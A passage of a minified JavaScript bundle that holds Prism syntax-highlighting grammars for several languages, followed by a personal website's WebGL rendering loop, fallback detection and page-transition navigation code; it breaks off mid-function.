roxy_cache_min_uses|proxy_cache_path|proxy_cache_use_stale|proxy_cache_valid|proxy_connect_timeout|proxy_cookie_domain|proxy_cookie_path|proxy_headers_hash_bucket_size|proxy_headers_hash_max_size|proxy_hide_header|proxy_http_version|proxy_ignore_client_abort|proxy_ignore_headers|proxy_intercept_errors|proxy_max_temp_file_size|proxy_method|proxy_next_upstream|proxy_no_cache|proxy_pass|proxy_pass_error_message|proxy_pass_header|proxy_pass_request_body|proxy_pass_request_headers|proxy_read_timeout|proxy_redirect|proxy_redirect_errors|proxy_send_lowat|proxy_send_timeout|proxy_set_body|proxy_set_header|proxy_ssl_session_reuse|proxy_store|proxy_store_access|proxy_temp_file_write_size|proxy_temp_path|proxy_timeout|proxy_upstream_fail_timeout|proxy_upstream_max_fails|random_index|read_ahead|real_ip_header|recursive_error_pages|request_pool_size|reset_timedout_connection|resolver|resolver_timeout|return|rewrite|root|rtsig_overflow_events|rtsig_overflow_test|rtsig_overflow_threshold|rtsig_signo|satisfy|satisfy_any|secure_link_secret|send_lowat|send_timeout|sendfile|sendfile_max_chunk|server|server_name|server_name_in_redirect|server_names_hash_bucket_size|server_names_hash_max_size|server_tokens|set|set_real_ip_from|smtp_auth|smtp_capabilities|so_keepalive|source_charset|split_clients|ssi|ssi_silent_errors|ssi_types|ssi_value_length|ssl|ssl_certificate|ssl_certificate_key|ssl_ciphers|ssl_client_certificate|ssl_crl|ssl_dhparam|ssl_engine|ssl_prefer_server_ciphers|ssl_protocols|ssl_session_cache|ssl_session_timeout|ssl_verify_client|ssl_verify_depth|starttls|stub_status|sub_filter|sub_filter_once|sub_filter_types|tcp_nodelay|tcp_nopush|timeout|timer_resolution|try_files|types|types_hash_bucket_size|types_hash_max_size|underscores_in_headers|uninitialized_variable_warn|upstream|use|user|userid|userid_domain|userid_expires|userid_name|userid_p3p|userid_path|userid_service|valid_referers|variables_hash_bucket_size|variables_hash_max_size|worker_connections|worker_cpu_affinity|worker_priority|worker_processes|worker_rlimit_core|worker_rlimit_nofile|worker_rlimit_sigpending|working_directory|xclient|xml_entities|xslt_entities|xslt_stylesheet|xslt_types|ssl_session_tickets|ssl_stapling|ssl_stapling_verify|ssl_ecdh_curve|ssl_trusted_certificate|more_set_headers|ssl_early_data)\b/i}),Prism.languages.insertBefore("nginx","keyword",{variable:/\$[a-z_]+/i});Prism.languages.ocaml={comment:/\(\*[\s\S]*?\*\)/,string:[{pattern:/"(?:\\.|[^\\\r\n"])*"/,greedy:!0},{pattern:/(['`])(?:\\(?:\d+|x[\da-f]+|.)|(?!\1)[^\\\r\n])\1/i,greedy:!0}],number:/\b(?:0x[\da-f][\da-f_]+|(?:0[bo])?\d[\d_]*\.?[\d_]*(?:e[+-]?[\d_]+)?)/i,type:{pattern:/\B['`]\w*/,alias:"variable"},directive:{pattern:/\B#\w+/,alias:"function"},keyword:/\b(?:as|assert|begin|class|constraint|do|done|downto|else|end|exception|external|for|fun|function|functor|if|in|include|inherit|initializer|lazy|let|match|method|module|mutable|new|object|of|open|prefix|private|rec|then|sig|struct|to|try|type|val|value|virtual|where|while|with)\b/,"boolean":/\b(?:false|true)\b/,operator:/:=|[=<>@^|&+\-*\/$%!?~][!$%&*+\-.\/:<=>?@^|~]*|\b(?:and|asr|land|lor|lxor|lsl|lsr|mod|nor|or)\b/,punctuation:/[(){}\[\]|_.,:;]/};Prism.languages.sql={comment:{pattern:/(^|[^\\])(?:\/\*[\s\S]*?\*\/|(?:--|\/\/|#).*)/,lookbehind:!0},variable:[{pattern:/@(["'`])(?:\\[\s\S]|(?!\1)[^\\])+\1/,greedy:!0},/@[\w.$]+/],string:{pattern:/(^|[^@\\])("|')(?:\\[\s\S]|(?!\2)[^\\]|\2\2)*\2/,greedy:!0,lookbehind:!0},"function":/\b(?:AVG|COUNT|FIRST|FORMAT|LAST|LCASE|LEN|MAX|MID|MIN|MOD|NOW|ROUND|SUM|UCASE)(?=\s*\()/i,keyword:/\b(?:ACTION|ADD|AFTER|ALGORITHM|ALL|ALTER|ANALYZE|ANY|APPLY|AS|ASC|AUTHORIZATION|AUTO_INCREMENT|BACKUP|BDB|BEGIN|BERKELEYDB|BIGINT|BINARY|BIT|BLOB|BOOL|BOOLEAN|BREAK|BROWSE|BTREE|BULK|BY|CALL|CASCADED?|CASE|CHAIN|CHAR(?:ACTER|SET)?|CHECK(?:POINT)?|CLOSE|CLUSTERED|COALESCE|COLLATE|COLUMNS?|COMMENT|COMMIT(?:TED)?|COMPUTE|CONNECT|CONSISTENT|CONSTRAINT|CONTAINS(?:TABLE)?|CONTINUE|CONVERT|CREATE|CROSS|CURRENT(?:_DATE|_TIME|_TIMESTAMP|_USER)?|CURSOR|CYCLE|DATA(?:BASES?)?|DATE(?:TIME)?|DAY|DBCC|DEALLOCATE|DEC|DECIMAL|DECLARE|DEFAULT|DEFINER|DELAYED|DELETE|DELIMITERS?|DENY|DESC|DESCRIBE|DETERMINISTIC|DISABLE|DISCARD|DISK|DISTINCT|DISTINCTROW|DISTRIBUTED|DO|DOUBLE|DROP|DUMMY|DUMP(?:FILE)?|DUPLICATE|ELSE(?:IF)?|ENABLE|ENCLOSED|END|ENGINE|ENUM|ERRLVL|ERRORS|ESCAPED?|EXCEPT|EXEC(?:UTE)?|EXISTS|EXIT|EXPLAIN|EXTENDED|FETCH|FIELDS|FILE|FILLFACTOR|FIRST|FIXED|FLOAT|FOLLOWING|FOR(?: EACH ROW)?|FORCE|FOREIGN|FREETEXT(?:TABLE)?|FROM|FULL|FUNCTION|GEOMETRY(?:COLLECTION)?|GLOBAL|GOTO|GRANT|GROUP|HANDLER|HASH|HAVING|HOLDLOCK|HOUR|IDENTITY(?:_INSERT|COL)?|IF|IGNORE|IMPORT|INDEX|INFILE|INNER|INNODB|INOUT|INSERT|INT|INTEGER|INTERSECT|INTERVAL|INTO|INVOKER|ISOLATION|ITERATE|JOIN|KEYS?|KILL|LANGUAGE|LAST|LEAVE|LEFT|LEVEL|LIMIT|LINENO|LINES|LINESTRING|LOAD|LOCAL|LOCK|LONG(?:BLOB|TEXT)|LOOP|MATCH(?:ED)?|MEDIUM(?:BLOB|INT|TEXT)|MERGE|MIDDLEINT|MINUTE|MODE|MODIFIES|MODIFY|MONTH|MULTI(?:LINESTRING|POINT|POLYGON)|NATIONAL|NATURAL|NCHAR|NEXT|NO|NONCLUSTERED|NULLIF|NUMERIC|OFF?|OFFSETS?|ON|OPEN(?:DATASOURCE|QUERY|ROWSET)?|OPTIMIZE|OPTION(?:ALLY)?|ORDER|OUT(?:ER|FILE)?|OVER|PARTIAL|PARTITION|PERCENT|PIVOT|PLAN|POINT|POLYGON|PRECEDING|PRECISION|PREPARE|PREV|PRIMARY|PRINT|PRIVILEGES|PROC(?:EDURE)?|PUBLIC|PURGE|QUICK|RAISERROR|READS?|REAL|RECONFIGURE|REFERENCES|RELEASE|RENAME|REPEAT(?:ABLE)?|REPLACE|REPLICATION|REQUIRE|RESIGNAL|RESTORE|RESTRICT|RETURNS?|REVOKE|RIGHT|ROLLBACK|ROUTINE|ROW(?:COUNT|GUIDCOL|S)?|RTREE|RULE|SAVE(?:POINT)?|SCHEMA|SECOND|SELECT|SERIAL(?:IZABLE)?|SESSION(?:_USER)?|SET(?:USER)?|SHARE|SHOW|SHUTDOWN|SIMPLE|SMALLINT|SNAPSHOT|SOME|SONAME|SQL|START(?:ING)?|STATISTICS|STATUS|STRIPED|SYSTEM_USER|TABLES?|TABLESPACE|TEMP(?:ORARY|TABLE)?|TERMINATED|TEXT(?:SIZE)?|THEN|TIME(?:STAMP)?|TINY(?:BLOB|INT|TEXT)|TOP?|TRAN(?:SACTIONS?)?|TRIGGER|TRUNCATE|TSEQUAL|TYPES?|UNBOUNDED|UNCOMMITTED|UNDEFINED|UNION|UNIQUE|UNLOCK|UNPIVOT|UNSIGNED|UPDATE(?:TEXT)?|USAGE|USE|USER|USING|VALUES?|VAR(?:BINARY|CHAR|CHARACTER|YING)|VIEW|WAITFOR|WARNINGS|WHEN|WHERE|WHILE|WITH(?: ROLLUP|IN)?|WORK|WRITE(?:TEXT)?|YEAR)\b/i,"boolean":/\b(?:TRUE|FALSE|NULL)\b/i,number:/\b0x[\da-f]+\b|\b\d+\.?\d*|\B\.\d+\b/i,operator:/[-+*\/=%^~]|&&?|\|\|?|!=?|<(?:=>?|<|>)?|>[>=]?|\b(?:AND|BETWEEN|IN|LIKE|NOT|OR|IS|DIV|REGEXP|RLIKE|SOUNDS LIKE|XOR)\b/i,punctuation:/[;[\]()`,.]/};!function(c){var b=/\b(?:double|float|[su]?int(?:32|64)|s?fixed(?:32|64)|bool|string|bytes)\b/;c.languages.protobuf=c.languages.extend("clike",{"class-name":{pattern:/(\b(?:enum|extend|message|service)\s+)[A-Za-z_]\w*(?=\s*\{)/,lookbehind:!0},keyword:/\b(?:enum|extend|extensions|import|message|oneof|option|optional|package|public|repeated|required|reserved|service|syntax|to)\b/}),c.languages.insertBefore("protobuf","operator",{map:{pattern:/\bmap<\s*[\w.]+\s*,\s*[\w.]+\s*>(?=\s+[A-Za-z_]\w*\s*[=;])/,alias:"class-name",inside:{punctuation:/[<>.,]/,builtin:b}},builtin:b,"positional-class-name":{pattern:/(?:\b|\B\.)[A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*(?=\s+[A-Za-z_]\w*\s*[=;])/,alias:"class-name",inside:{punctuation:/\./}},annotation:{pattern:/(\[\s*)[A-Za-z_]\w*(?=\s*=)/,lookbehind:!0}})}(Prism);Prism.languages.python={comment:{pattern:/(^|[^\\])#.*/,lookbehind:!0},"string-interpolation":{pattern:/(?:f|rf|fr)(?:("""|''')[\s\S]+?\1|("|')(?:\\.|(?!\2)[^\\\r\n])*\2)/i,greedy:!0,inside:{interpolation:{pattern:/((?:^|[^{])(?:{{)*){(?!{)(?:[^{}]|{(?!{)(?:[^{}]|{(?!{)(?:[^{}])+})+})+}/,lookbehind:!0,inside:{"format-spec":{pattern:/(:)[^:(){}]+(?=}$)/,lookbehind:!0},"conversion-option":{pattern:/![sra](?=[:}]$)/,alias:"punctuation"},rest:null}},string:/[\s\S]+/}},"triple-quoted-string":{pattern:/(?:[rub]|rb|br)?("""|''')[\s\S]+?\1/i,greedy:!0,alias:"string"},string:{pattern:/(?:[rub]|rb|br)?("|')(?:\\.|(?!\1)[^\\\r\n])*\1/i,greedy:!0},"function":{pattern:/((?:^|\s)def[ \t]+)[a-zA-Z_]\w*(?=\s*\()/g,lookbehind:!0},"class-name":{pattern:/(\bclass\s+)\w+/i,lookbehind:!0},decorator:{pattern:/(^\s*)@\w+(?:\.\w+)*/i,lookbehind:!0,alias:["annotation","punctuation"],inside:{punctuation:/\./}},keyword:/\b(?:and|as|assert|async|await|break|class|continue|def|del|elif|else|except|exec|finally|for|from|global|if|import|in|is|lambda|nonlocal|not|or|pass|print|raise|return|try|while|with|yield)\b/,builtin:/\b(?:__import__|abs|all|any|apply|ascii|basestring|bin|bool|buffer|bytearray|bytes|callable|chr|classmethod|cmp|coerce|compile|complex|delattr|dict|dir|divmod|enumerate|eval|execfile|file|filter|float|format|frozenset|getattr|globals|hasattr|hash|help|hex|id|input|int|intern|isinstance|issubclass|iter|len|list|locals|long|map|max|memoryview|min|next|object|oct|open|ord|pow|property|range|raw_input|reduce|reload|repr|reversed|round|set|setattr|slice|sorted|staticmethod|str|sum|super|tuple|type|unichr|unicode|vars|xrange|zip)\b/,"boolean":/\b(?:True|False|None)\b/,number:/(?:\b(?=\d)|\B(?=\.))(?:0[bo])?(?:(?:\d|0x[\da-f])[\da-f]*\.?\d*|\.\d+)(?:e[+-]?\d+)?j?\b/i,operator:/[-+%=]=?|!=|\*\*?=?|\/\/?=?|<[<=>]?|>[=>]?|[&|^~]/,punctuation:/[{}[\];(),.:]/},Prism.languages.python["string-interpolation"].inside.interpolation.inside.rest=Prism.languages.python,Prism.languages.py=Prism.languages.python;!function(b){var a=b.util.clone(b.languages.javascript);b.languages.jsx=b.languages.extend("markup",a),b.languages.jsx.tag.pattern=/<\/?(?:[\w.:-]+\s*(?:\s+(?:[\w.:-]+(?:=(?:("|')(?:\\[\s\S]|(?!\1)[^\\])*\1|[^\s{'">=]+|\{(?:\{(?:\{[^}]*\}|[^{}])*\}|[^{}])+\}))?|\{\.{3}[a-z_$][\w$]*(?:\.[a-z_$][\w$]*)*\}))*\s*\/?)?>/i,b.languages.jsx.tag.inside.tag.pattern=/^<\/?[^\s>\/]*/i,b.languages.jsx.tag.inside["attr-value"].pattern=/=(?!\{)(?:("|')(?:\\[\s\S]|(?!\1)[^\\])*\1|[^\s'">]+)/i,b.languages.jsx.tag.inside.tag.inside["class-name"]=/^[A-Z]\w*(?:\.[A-Z]\w*)*$/,b.languages.insertBefore("inside","attr-name",{spread:{pattern:/\{\.{3}[a-z_$][\w$]*(?:\.[a-z_$][\w$]*)*\}/,inside:{punctuation:/\.{3}|[{}.]/,"attr-value":/\w+/}}},b.languages.jsx.tag),b.languages.insertBefore("inside","attr-value",{script:{pattern:/=(\{(?:\{(?:\{[^}]*\}|[^}])*\}|[^}])+\})/i,inside:{"script-punctuation":{pattern:/^=(?={)/,alias:"punctuation"},rest:b.languages.jsx},alias:"language-javascript"}},b.languages.jsx.tag);var e=function(f){return f?"string"==typeof f?f:"string"==typeof f.content?f.content:f.content.map(e).join(""):""},c=function(h){for(var m=[],l=0;l<h.length;l++){var f=h[l],j=!1;if("string"!=typeof f&&("tag"===f.type&&f.content[0]&&"tag"===f.content[0].type?"</"===f.content[0].content[0].content?0<m.length&&m[m.length-1].tagName===e(f.content[0].content[1])&&m.pop():"/>"===f.content[f.content.length-1].content||m.push({tagName:e(f.content[0].content[1]),openedBraces:0}):0<m.length&&"punctuation"===f.type&&"{"===f.content?m[m.length-1].openedBraces++:0<m.length&&0<m[m.length-1].openedBraces&&"punctuation"===f.type&&"}"===f.content?m[m.length-1].openedBraces--:j=!0),(j||"string"==typeof f)&&0<m.length&&0===m[m.length-1].openedBraces){var k=e(f);l<h.length-1&&("string"==typeof h[l+1]||"plain-text"===h[l+1].type)&&(k+=e(h[l+1]),h.splice(l+1,1)),0<l&&("string"==typeof h[l-1]||"plain-text"===h[l-1].type)&&(k=e(h[l-1])+k,h.splice(l-1,1),l--),h[l]=new b.Token("plain-text",k,null,k)}f.content&&"string"!=typeof f.content&&c(f.content)}};b.hooks.add("after-tokenize",function(f){"jsx"!==f.language&&"tsx"!==f.language||c(f.tokens)})}(Prism);Prism.languages.rust={comment:[{pattern:/(^|[^\\])\/\*[\s\S]*?\*\//,lookbehind:!0},{pattern:/(^|[^\\:])\/\/.*/,lookbehind:!0}],string:[{pattern:/b?r(#*)"(?:\\.|(?!"\1)[^\\\r\n])*"\1/,greedy:!0},{pattern:/b?"(?:\\.|[^\\\r\n"])*"/,greedy:!0}],"char":{pattern:/b?'(?:\\(?:x[0-7][\da-fA-F]|u{(?:[\da-fA-F]_*){1,6}|.)|[^\\\r\n\t'])'/,alias:"string"},"lifetime-annotation":{pattern:/'[^\s>']+/,alias:"symbol"},keyword:/\b(?:abstract|alignof|as|async|await|be|box|break|const|continue|crate|do|dyn|else|enum|extern|false|final|fn|for|if|impl|in|let|loop|match|mod|move|mut|offsetof|once|override|priv|pub|pure|ref|return|sizeof|static|self|Self|struct|super|true|trait|type|typeof|union|unsafe|unsized|use|virtual|where|while|yield)\b/,attribute:{pattern:/#!?\[.+?\]/,greedy:!0,alias:"attr-name"},"function":[/\w+(?=\s*\()/,/\w+!(?=\s*\(|\[)/],"macro-rules":{pattern:/\w+!/,alias:"function"},number:/\b(?:0x[\dA-Fa-f](?:_?[\dA-Fa-f])*|0o[0-7](?:_?[0-7])*|0b[01](?:_?[01])*|(\d(?:_?\d)*)?\.?\d(?:_?\d)*(?:[Ee][+-]?\d+)?)(?:_?(?:[iu](?:8|16|32|64)?|f32|f64))?\b/,"closure-params":{pattern:/\|[^|]*\|(?=\s*[{-])/,inside:{punctuation:/[|:,]/,operator:/[&*]/}},punctuation:/->|\.\.=|\.{1,3}|::|[{}[\];(),:]/,operator:/[-+*\/%!^]=?|=[=>]?|&[&=]?|\|[|=]?|<<?=?|>>?=?|[@?]/};Prism.languages.yaml={scalar:{pattern:/([\-:]\s*(?:![^\s]+)?[ \t]*[|>])[ \t]*(?:((?:\r?\n|\r)[ \t]+)[^\r\n]+(?:\2[^\r\n]+)*)/,lookbehind:!0,alias:"string"},comment:/#.*/,key:{pattern:/(\s*(?:^|[:\-,[{\r\n?])[ \t]*(?:![^\s]+)?[ \t]*)[^\r\n{[\]},#\s]+?(?=\s*:\s)/,lookbehind:!0,alias:"atrule"},directive:{pattern:/(^[ \t]*)%.+/m,lookbehind:!0,alias:"important"},datetime:{pattern:/([:\-,[{]\s*(?:![^\s]+)?[ \t]*)(?:\d{4}-\d\d?-\d\d?(?:[tT]|[ \t]+)\d\d?:\d{2}:\d{2}(?:\.\d*)?[ \t]*(?:Z|[-+]\d\d?(?::\d{2})?)?|\d{4}-\d{2}-\d{2}|\d\d?:\d{2}(?::\d{2}(?:\.\d*)?)?)(?=[ \t]*(?:$|,|]|}))/m,lookbehind:!0,alias:"number"},"boolean":{pattern:/([:\-,[{]\s*(?:![^\s]+)?[ \t]*)(?:true|false)[ \t]*(?=$|,|]|})/im,lookbehind:!0,alias:"important"},"null":{pattern:/([:\-,[{]\s*(?:![^\s]+)?[ \t]*)(?:null|~)[ \t]*(?=$|,|]|})/im,lookbehind:!0,alias:"important"},string:{pattern:/([:\-,[{]\s*(?:![^\s]+)?[ \t]*)("|')(?:(?!\2)[^\\\r\n]|\\.)*\2(?=[ \t]*(?:$|,|]|}|\s*#))/m,lookbehind:!0,greedy:!0},number:{pattern:/([:\-,[{]\s*(?:![^\s]+)?[ \t]*)[+-]?(?:0x[\da-f]+|0o[0-7]+|(?:\d+\.?\d*|\.?\d+)(?:e[+-]?\d+)?|\.inf|\.nan)[ \t]*(?=$|,|]|})/im,lookbehind:!0},tag:/![^\s]+/,important:/[&*][\w]+/,punctuation:/---|[:[\]{}\-,|>?]|\.\.\./},Prism.languages.yml=Prism.languages.yaml;!function(a){var b="(?:[\\w-]+|'[^'\n\r]*'|\"(?:\\.|[^\\\\\"\r\n])*\")";Prism.languages.toml={comment:{pattern:/#.*/,greedy:!0},table:{pattern:RegExp("(^\\s*\\[\\s*(?:\\[\\s*)?)"+b+"(?:\\s*\\.\\s*"+b+")*(?=\\s*\\])","m"),lookbehind:!0,greedy:!0,alias:"class-name"},key:{pattern:RegExp("(^\\s*|[{,]\\s*)"+b+"(?:\\s*\\.\\s*"+b+")*(?=\\s*=)","m"),lookbehind:!0,greedy:!0,alias:"property"},string:{pattern:/"""(?:\\[\s\S]|[^\\])*?"""|'''[\s\S]*?'''|'[^'\n\r]*'|"(?:\\.|[^\\"\r\n])*"/,greedy:!0},date:[{pattern:/\d{4}-\d{2}-\d{2}(?:[T\s]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:\d{2})?)?/i,alias:"number"},{pattern:/\d{2}:\d{2}:\d{2}(?:\.\d+)?/i,alias:"number"}],number:/(?:\b0(?:x[\da-zA-Z]+(?:_[\da-zA-Z]+)*|o[0-7]+(?:_[0-7]+)*|b[10]+(?:_[10]+)*))\b|[-+]?\d+(?:_\d+)*(?:\.\d+(?:_\d+)*)?(?:[eE][+-]?\d+(?:_\d+)*)?\b|[-+]?(?:inf|nan)\b/,"boolean":/\b(?:true|false)\b/,punctuation:/[.,=[\]{}]/}}();var typescript=Prism.util.clone(Prism.languages.typescript);Prism.languages.tsx=Prism.languages.extend("jsx",typescript);Prism.languages.wasm={comment:[/\(;[\s\S]*?;\)/,{pattern:/;;.*/,greedy:!0}],string:{pattern:/"(?:\\[\s\S]|[^"\\])*"/,greedy:!0},keyword:[{pattern:/\b(?:align|offset)=/,inside:{operator:/=/}},{pattern:/\b(?:(?:f32|f64|i32|i64)(?:\.(?:abs|add|and|ceil|clz|const|convert_[su]\/i(?:32|64)|copysign|ctz|demote\/f64|div(?:_[su])?|eqz?|extend_[su]\/i32|floor|ge(?:_[su])?|gt(?:_[su])?|le(?:_[su])?|load(?:(?:8|16|32)_[su])?|lt(?:_[su])?|max|min|mul|nearest|neg?|or|popcnt|promote\/f32|reinterpret\/[fi](?:32|64)|rem_[su]|rot[lr]|shl|shr_[su]|store(?:8|16|32)?|sqrt|sub|trunc(?:_[su]\/f(?:32|64))?|wrap\/i64|xor))?|memory\.(?:grow|size))\b/,inside:{punctuation:/\./}},/\b(?:anyfunc|block|br(?:_if|_table)?|call(?:_indirect)?|data|drop|elem|else|end|export|func|get_(?:global|local)|global|if|import|local|loop|memory|module|mut|nop|offset|param|result|return|select|set_(?:global|local)|start|table|tee_local|then|type|unreachable)\b/],variable:/\$[\w!#$%&'*+\-./:<=>?@\\^_`|~]+/i,number:/[+-]?\b(?:\d(?:_?\d)*(?:\.\d(?:_?\d)*)?(?:[eE][+-]?\d(?:_?\d)*)?|0x[\da-fA-F](?:_?[\da-fA-F])*(?:\.[\da-fA-F](?:_?[\da-fA-D])*)?(?:[pP][+-]?\d(?:_?\d)*)?)\b|\binf\b|\bnan(?::0x[\da-fA-F](?:_?[\da-fA-D])*)?\b/,punctuation:/[()]/};window.Acko=window.Acko||{};var π=Math.PI,τ=π*2;var rand=(function(){var a=0;return function(b){a=b||a;a=((a+2127912214)+(a<<12))&4294967295;a=((a^3345072700)^(a>>>19))&4294967295;a=((a+374761393)+(a<<5))&4294967295;a=((a+3550635116)^(a<<9))&4294967295;a=((a+4251993797)+(a<<3))&4294967295;a=((a^3042594569)^(a>>>16))&4294967295;return(a&268435455)/268435456}})();function pow(b,c){var e=(b<0)?-1:1;return e*Math.pow(Math.abs(b),c)}function tick(){var a=+new Date();return function(b){var c=(+new Date()-a);console.log(b,c+" ms");return c}}var log=(function(){var b=0;var a=500;return function(){if(b++<a){console.log.apply(console,arguments)}}})();var getStorage=function(a){var c=localStorage[a];if(c){try{c=JSON.parse(c)}catch(b){}}if(!c||typeof c!="object"||c.forEach){c={}}return c};var setStorage=function(a,b){localStorage[a]=JSON.stringify(b)};Acko.Behaviors=[];Acko.Behaviors.apply=function(a){a=a||document.body;this.forEach(function(b){b(a)})};var _v=function(a,c,b){return new THREE.Vector3(a,c,b)};var forEach=function(a,b){Array.prototype.forEach.call(a,b)};var Time=(function(){var j=false;var h=1;var c=1;var b=0;var l=+new Date();var a=true;var k=900;function g(){a=(+new Date()-l)>k}setInterval(g,1000);requestAnimationFrame(function f(){a=false;requestAnimationFrame(f);var p=j?0.2:1;h=h+(p-h)*0.2;c=c+(h-c)*0.2;var o=+new Date();b+=(o-l)*c;l=o});document.addEventListener("keydown",m);document.addEventListener("keyup",m);function m(o){j=o.shiftKey}var e={};return{clock:function(o){o=o||"";if(e[o]==undefined){e[o]=Time.get()}return(Time.get()-e[o])/1000},getSpeed:function(){return c},isBackground:function(){return a},isSlow:function(){return j},get:function(){return b},absolute:function(){return(+new Date())/1000},}})();Acko.Fallback=function(){document.documentElement.classList.add("no-js");document.documentElement.classList.remove("js");var a=window.scroller=new Acko.NativeScroll(0,20000);a.init();var b=window.nav=new Acko.Nav("native-frame",a);b.updateExtents();Acko.Behaviors.apply(document.body)};Acko.Fallback.isRequired=(function(){var h=navigator.userAgent.match(/Opera/)&&!navigator.userAgent.match(/WebKit/);var f=document.createElement("canvas");var b=!!(f&&window.WebGLRenderingContext&&f.getContext("experimental-webgl"));var a=/Trident\/7/.test(navigator.userAgent);var c=/mobile/i.test(navigator.userAgent)&&!/ipad/i.test(navigator.userAgent);var e=/android/i.test(navigator.userAgent)||/ipad/i.test(navigator.userAgent);var j=location.hash=="#flat";var g=true;return function(){return h||!b||a||c||e||j}})();Acko.Fallback.warnWebGL=function(){return;if(Acko.Fallback.isRequired()){var b=document.querySelector("#webgl-warning a.close:not(.pinged)");if(b){b.classList.add("pinged");b.addEventListener("click",function(c){c.preventDefault();Acko.Fallback.dismissWebGL()})}var a=document.querySelector("#webgl-warning");a.style.display="block";a.classList.remove("collapsed")}};Acko.Fallback.dismissWebGL=function(){var a=document.querySelector("#webgl-warning");a.classList.add("collapsed")};var classes=document.documentElement.classList;classes.add("js");classes.remove("no-js");DomReady.ready(function(){if(Acko.Fallback.isRequired()){Acko.Fallback()}else{Acko.Main()}});Acko.Main=function(){var p=location.pathname=="/";var a=new Acko.NativeScroll(0,20000);var r=Acko.Effect.Camera.camera;a.init();var u=window.stats=new Stats();u.domElement.style.position="fixed";u.domElement.style.zIndex=100;u.domElement.style.display="none";document.body.appendChild(u.domElement);var g={stencil:false,alpha:false,antialias:true,};if(window.devicePixelRatio>=2&&screen.width>=1400){g.devicePixelRatio=1}var q=new Acko.Renderer({effects:Acko.Effects,klass:THREE.WebGLRenderer,camera:r,type:"webgl",parameters:g,autoSize:true,autoRender:false,dead:true,});q.init();var w=document.getElementById("camera-frame");var b=new Acko.Renderer({effects:Acko.Effects,klass:THREE.CSS3DRenderer,camera:r,type:"css3d",parameters:{cameraElement:w,},dead:true,});b.init();var j=new Acko.Nav("native-frame",a,q);j.updateExtents();window.onload=j.updateExtents();q.exports.scrollController=b.exports.scrollController=a;q.exports.doIntro=p;if(!p&&(a.get().y==0)){a.set(0,q.exports.pageStart-200)}window.nav=j;window.gl=q;window.css3d=b;window.scroller=a;Acko.Behaviors.apply(document.body);var o=true;var f=true;var k=null;var e=false;var h=true;var m=false;var c=null;var t=false;if(window.MathJax){f=false;MathJax.Hub.Queue(function(){f=true})}var l=0;function s(){requestAnimationFrame(s);m=false;var z=a.get();var y=!(k&&k.x==z.x&&k.y==z.y);var x=f&&(false||(Time.clock()<15)||!q.exports.pastMasthead||y||Math.abs(q.exports.cameraController.phiT)>0.0001||q.exports.visualizer.playing||!q.exports.cameraController.bound);k=z;if(y&&z.y==0){c=setTimeout(function(){q.resize(true)},500)}else{if(y&&c){clearTimeout(c);c=null}}if(f){q.tick();b.tick()}if(x||t||e){if(b.exports.masthead){q.exports.masthead=b.exports.masthead}q.visible(f);q.scroll(z);q.update();if(!q.exports.ride){b.exports.cameraLerp=q.exports.cameraLerp;b.exports.cameraController=q.exports.cameraController;b.exports.ride=q.exports.ride;b.exports.tracks=q.exports.tracks;b.visible(f);b.scroll(z);h&&b.update();h=!q.exports.pastMasthead}else{b.visible(false);h&&b.update();h=false}}q.exports.updateStats&&u.update();t=x;e=false;m=true}window.addEventListener("resize",function(){e=true});window.addEventListener("focus",function(){e=true;o=true;q.resize(true)}.bind(this));window.addEventListener("blur",function(){o=false});requestAnimationFrame(s);window.getIdle=function(){return m}};Acko.Queue=[];Acko.queue=function(a){Acko.Queue.push(a)};Acko.Behaviors.push(function(){Acko.Queue.forEach(function(a){a()});Acko.Queue=[]});(function(){if("scrollRestoration" in history){history.scrollRestoration="manual"}var beginMarker="<!-- Begin Content -->";var endMarker="<!-- End Content -->";var classMarker="nav-link";var pageTransition=0.4;var findAll=function(re,text){var result;var out=[];while((result=re.exec(text))!==null){out.push(result)}return out};var extractContent=function(html){var chunks=html.split(beginMarker);if(chunks[1]){chunks=chunks[1].split(endMarker);if(chunks){return chunks[0]}}return""};var extractTitle=function(html){var titles=findAll(/<title[^>]*>((.|\n)*?)<\/title>/gi,html);return titles&&decodeEntities(titles[0][1])||""};var extractVideos=function(html){var videos=findAll(/<video[^>]*>((.|\n)*?)<\/video>/gi,html);var out=[];videos.forEach(function(video){out.push({source:video[0]})});return out};var extractImages=function(html){var images=findAll(/<img[^>]*>/gi,html);var out=[];images.forEach(function(image){out.push({source:image[0]})});return out};var extractIframes=function(html){var iframes=findAll(/<iframe[^>]*>((.|\n)*?)<\/iframe>/gi,html);var out=[];iframes.forEach(function(iframe){out.push({source:iframe[0]})});return out};var extractScripts=function(html){var scripts=findAll(/<script([^>]*)>((.|\n)*?)<\/script>/gi,html);var out=[];scripts.forEach(function(script){var attributes=script[1];var local=script[2];var src=attributes.match(/\s*src=("([^"]*)"|'([^']*)'|([^>]*))/i);var type=attributes.match(/\s*type=("([^"]*)"|'([^']*)'|([^>]*))/i);if(type){type=(type[2]||"")+(type[3]||"")+(type[4]||"");if(type!="text/javascript"){return}}if(src){var url=decodeEntities((src[2]||"")+(src[3]||"")+(src[4]||""));if(url){out.push({source:script[0],url:url})}}else{if(local){out.push({source:script[0],local:local})}}});return out};var decodeEntities=function(string){var div=document.createElement("div");div.innerHTML=string;return div.textContent||div.innerText||string||""};var shift=function(el,x){var tr="translateX("+x+"px) translateZ(0px)";el.style.transform=tr;el.style.WebkitTransform=tr};Acko.Nav=function(selector,scroll,gl){this.container=document.getElementById(selector);this.scroll=scroll;this.gl=gl;this.animating=false;this.warm={};this.warm[location.href]=true;this.cache={};if(Acko.History.isSupported()){this.history=new Acko.History(this)}this.bind()};Acko.Nav.prototype={bind:function(){var resize=function(){this.width=window.innerWidth;this.updateExtents()}.bind(this);this.width=window.innerWidth;window.addEventListener("resize",resize);Acko.Behaviors.push(function(el){this.applyBehavior(el)}.bind(this))},updateExtents:function(){var h=0;forEach(this.container.children,function(el){h=Math.max(h,el.offsetHeight)});var computed=window.getComputedStyle(this.container);h+=this.container.offsetTop+(parseInt(computed.paddingTop)||0);this.scroll.extents(0,h)},applyBehavior:function(el){el=el||this.container;if(window.MathJax){MathJax.Hub.Queue(function(){this.updateExtents()}.bind(this))}var links=el.querySelectorAll("a:not(."+classMarker+")");forEach(links,function(el){el.classList.add(classMarker);var href=""+(el.getAttribute("href")||"");var local=href.match(/^\/(?!\/)/);if(local){el.addEventListener("click",function(e){if(el.classList.contains("history-back")){return}if(e.ctrlKey||e.metaKey||e.button!==0){return}e.preventDefault();var reverse=el.classList.contains("reverse");var 